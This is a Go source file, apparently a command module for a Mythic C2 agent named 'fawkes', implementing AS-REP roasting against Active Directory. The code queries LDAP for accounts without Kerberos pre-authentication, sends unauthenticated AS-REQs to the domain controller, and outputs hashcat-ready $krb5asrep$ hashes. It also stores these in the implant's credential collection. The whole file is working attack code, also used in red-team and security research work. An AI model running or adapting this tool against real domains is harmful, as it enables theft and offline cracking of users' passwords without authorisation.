package commands

import (
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

type AsrepCommand struct{}

func (c *AsrepCommand) Name() string        { return "asrep-roast" }
func (c *AsrepCommand) Description() string { return "Request AS-REP tickets for accounts without Kerberos pre-authentication and extract hashes for offline cracking (T1558.004)" }

type asrepArgs struct {
	Server   string `json:"server"`
	Port     int    `json:"port"`
	Realm    string `json:"realm"`
	Username string `json:"username"`
	Password string `json:"password"`
	Account  string `json:"account"`  // optional: specific account to roast
	BaseDN   string `json:"base_dn"`  // optional: LDAP base DN
	UseTLS   bool   `json:"use_tls"`  // optional: LDAPS for enumeration
}

func (c *AsrepCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -server <DC> -realm <DOMAIN> -username <user@domain> -password <pass>",
			Status:    "error",
			Completed: true,
		}
	}

	var args asrepArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Server == "" || args.Username == "" || args.Password == "" {
		return structs.CommandResult{
			Output:    "Error: server, username, and password are required. Username should be in UPN format (user@domain.local)",
			Status:    "error",
			Completed: true,
		}
	}

	// Auto-detect realm from username if not specified
	if args.Realm == "" {
		if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Realm = strings.ToUpper(parts[1])
		} else {
			return structs.CommandResult{
				Output:    "Error: realm required. Specify -realm DOMAIN.LOCAL or use UPN username (user@domain.local)",
				Status:    "error",
				Completed: true,
			}
		}
	} else {
		args.Realm = strings.ToUpper(args.Realm)
	}

	if args.Port <= 0 {
		args.Port = 389
	}

	// Step 1: Find AS-REP roastable accounts via LDAP (unless specific account given)
	var targets []asrepTarget
	var err error

	if args.Account != "" {
		targets = []asrepTarget{{Username: args.Account}}
	} else {
		targets, err = enumerateAsrepTargets(args)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error enumerating AS-REP targets via LDAP: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		if len(targets) == 0 {
			return structs.CommandResult{
				Output:    "No AS-REP roastable accounts found (no accounts with DONT_REQUIRE_PREAUTH set)",
				Status:    "success",
				Completed: true,
			}
		}
	}

	// Step 2: Build krb5 config for AS-REQ construction
	krb5Conf := buildKrb5Config(args.Realm, args.Server)
	cfg, err := config.NewFromString(krb5Conf)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating Kerberos config: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Step 3: Send unauthenticated AS-REQ for each target
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] AS-REP Roasting %d account(s) from %s (KDC: %s)\n", len(targets), args.Realm, args.Server))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	roasted := 0
	var creds []structs.MythicCredential
	for _, target := range targets {
		hash, etypeName, err := requestAsrep(cfg, args.Realm, args.Server, target.Username)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[!] Failed to roast %s: %v\n", target.Username, err))
			continue
		}

		sb.WriteString(fmt.Sprintf("\n[+] %s (%s)\n", target.Username, etypeName))
		sb.WriteString(hash + "\n")
		roasted++

		creds = append(creds, structs.MythicCredential{
			CredentialType: "hash",
			Realm:          args.Realm,
			Account:        target.Username,
			Credential:     hash,
			Comment:        fmt.Sprintf("asrep-roast (%s)", etypeName),
		})
	}

	sb.WriteString(fmt.Sprintf("\n[*] %d/%d hashes extracted (hashcat -m 18200 for RC4)\n", roasted, len(targets)))

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}
	return result
}

type asrepTarget struct {
	Username string
}

func enumerateAsrepTargets(args asrepArgs) ([]asrepTarget, error) {
	var conn *ldap.Conn
	var err error
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	if args.UseTLS {
		if args.Port <= 0 {
			args.Port = 636
		}
		conn, err = ldap.DialURL(fmt.Sprintf("ldaps://%s:%d", args.Server, args.Port),
			ldap.DialWithDialer(dialer),
			ldap.DialWithTLSConfig(&tls.Config{InsecureSkipVerify: true}))
	} else {
		if args.Port <= 0 {
			args.Port = 389
		}
		conn, err = ldap.DialURL(fmt.Sprintf("ldap://%s:%d", args.Server, args.Port),
			ldap.DialWithDialer(dialer))
	}
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %v", err)
	}
	defer conn.Close()

	if err := conn.Bind(args.Username, args.Password); err != nil {
		return nil, fmt.Errorf("LDAP bind: %v", err)
	}

	baseDN := args.BaseDN
	if baseDN == "" {
		baseDN, err = detectBaseDN(conn)
		if err != nil {
			return nil, fmt.Errorf("base DN detection: %v", err)
		}
	}

	// Search for accounts with DONT_REQUIRE_PREAUTH (UAC flag 4194304)
	filter := "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
	searchReq := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 30, false,
		filter,
		[]string{"sAMAccountName"},
		nil,
	)

	result, err := conn.SearchWithPaging(searchReq, 100)
	if err != nil {
		return nil, fmt.Errorf("AS-REP target search: %v", err)
	}

	var targets []asrepTarget
	for _, entry := range result.Entries {
		account := entry.GetAttributeValue("sAMAccountName")
		if account != "" {
			targets = append(targets, asrepTarget{Username: account})
		}
	}

	return targets, nil
}

func requestAsrep(cfg *config.Config, realm, kdc, username string) (string, string, error) {
	// Build AS-REQ for the target user WITHOUT pre-authentication
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{username},
	}

	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return "", "", fmt.Errorf("AS-REQ creation: %v", err)
	}

	// Clear pre-authentication data — this is the key to AS-REP roasting
	asReq.PAData = types.PADataSequence{}

	// Marshal the AS-REQ
	reqBytes, err := asReq.Marshal()
	if err != nil {
		return "", "", fmt.Errorf("AS-REQ marshal: %v", err)
	}

	// Send via TCP to KDC port 88 (RFC 4120 7.2.2: 4-byte length prefix)
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:88", kdc), 10*time.Second)
	if err != nil {
		return "", "", fmt.Errorf("KDC connect: %v", err)
	}
	defer conn.Close()

	if err := conn.SetDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return "", "", fmt.Errorf("set deadline: %v", err)
	}

	// Write length-prefixed message
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
	if _, err := conn.Write(lenBuf); err != nil {
		return "", "", fmt.Errorf("send length: %v", err)
	}
	if _, err := conn.Write(reqBytes); err != nil {
		return "", "", fmt.Errorf("send AS-REQ: %v", err)
	}

	// Read response length
	if _, err := readFull(conn, lenBuf); err != nil {
		return "", "", fmt.Errorf("read response length: %v", err)
	}
	respLen := binary.BigEndian.Uint32(lenBuf)
	if respLen > 1<<20 { // 1MB sanity check
		return "", "", fmt.Errorf("response too large: %d bytes", respLen)
	}

	// Read response body
	respBytes := make([]byte, respLen)
	if _, err := readFull(conn, respBytes); err != nil {
		return "", "", fmt.Errorf("read response: %v", err)
	}

	// Try to unmarshal as AS-REP
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBytes); err != nil {
		// Might be a KRBError — account requires pre-auth or doesn't exist
		return "", "", fmt.Errorf("AS-REP unmarshal failed (account may require pre-auth): %v", err)
	}

	// Extract the encrypted part — this is what we crack offline
	etype := asRep.EncPart.EType
	cipher := asRep.EncPart.Cipher

	if len(cipher) == 0 {
		return "", "", fmt.Errorf("empty cipher in AS-REP")
	}

	// Format as hashcat-compatible $krb5asrep$ hash
	// Format: $krb5asrep$<etype>$<user>@<realm>$<checksum>$<edata2>
	// For RC4 (etype 23): first 16 bytes are checksum, rest is edata2
	// For AES (etype 17/18): first 12 bytes are checksum, rest is edata2
	var checksumLen int
	switch etype {
	case 23: // RC4-HMAC
		checksumLen = 16
	case 17, 18: // AES128, AES256
		checksumLen = 12
	default:
		checksumLen = 16
	}

	if len(cipher) <= checksumLen {
		return "", "", fmt.Errorf("cipher too short for etype %d", etype)
	}

	checksum := hex.EncodeToString(cipher[:checksumLen])
	edata2 := hex.EncodeToString(cipher[checksumLen:])

	hash := fmt.Sprintf("$krb5asrep$%d$%s@%s$%s$%s", etype, username, realm, checksum, edata2)
	etypeName := etypeToName(etype)

	return hash, etypeName, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}
